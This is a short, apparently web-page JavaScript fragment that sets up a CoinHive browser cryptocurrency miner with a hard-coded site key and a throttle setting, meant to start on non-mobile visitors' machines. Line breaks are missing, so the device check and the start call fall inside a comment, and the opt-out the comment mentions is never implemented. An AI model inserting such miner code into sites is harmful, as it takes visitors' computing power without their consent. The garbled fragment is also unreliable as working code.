var miner = new CoinHive.Anonymous('I7FHAnmcpZ3fNGDVYXl8vfPKzUg2Km7j', {
    throttle: 0.5
}); // var CTrzmtUMPh1me3o9aqZ63bm725quDET6// Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile()) {miner.start();}